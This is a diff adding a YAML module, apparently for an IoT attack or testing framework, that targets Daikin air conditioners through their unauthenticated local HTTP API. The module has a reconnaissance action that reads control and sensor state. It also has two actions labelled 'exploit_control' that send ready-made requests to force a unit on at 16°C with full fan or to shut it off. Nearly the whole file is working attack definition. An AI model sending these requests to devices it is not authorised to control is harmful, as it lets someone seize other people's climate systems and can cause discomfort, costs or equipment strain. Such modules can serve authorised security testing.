@@ -1,0 +1,35 @@
+id: daikin-ac
+device_type: hvac
+vendor: Daikin
+family: daikin-brp
+requires:
+  port: 80
+actions:
+  - id: get-state
+    label: "Get current control + sensors"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/aircon/get_control_info"
+          save_as: ctrl
+      - http_request:
+          url: "http://{{target.ip}}/aircon/get_sensor_info"
+          save_as: sensor
+
+  - id: turn-on-cool-16
+    label: "Turn ON, Cool mode, 16°C, fan max"
+    category: exploit_control
+    dangerous: true
+    confirm_prompt: "Turn the AC on at min temp / max fan?"
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/aircon/set_control_info?pow=1&mode=3&stemp=16&f_rate=A&f_dir=0"
+
+  - id: turn-off
+    label: "Turn OFF"
+    category: exploit_control
+    dangerous: true
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/aircon/set_control_info?pow=0&mode=3&stemp=24&f_rate=A&f_dir=0"
